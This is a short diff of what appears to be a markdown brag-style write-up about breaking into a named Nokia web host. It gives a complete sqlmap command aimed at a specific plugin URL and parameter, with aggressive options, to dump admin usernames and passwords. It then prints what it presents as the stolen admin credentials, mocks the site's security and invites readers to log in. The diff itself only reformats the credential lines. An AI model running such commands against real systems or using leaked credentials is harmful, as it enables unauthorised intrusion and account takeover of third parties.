@@ -14,9 +14,10 @@
 `$ sqlmap -u 'https://gdclive.nokia.com/plugins/editors/jckeditor/plugins/jtreelink/dialogs/links.php?extension=menu&view=menu&parent=' --level=5 --risk=3 --random-agent --technique=U -p parent --batch --all # for get the username and password of admins`
 
 #### Booom
-#### username : 123456
-#### password : adminuser
+  <h2> username :</h2> <h3>123456</h3>
+  <h2> password :</h2> <h3>adminuser</h3>
 <img src='src/oh.gif'>
+
 ###### So secure XD
 
 ### Try to login in
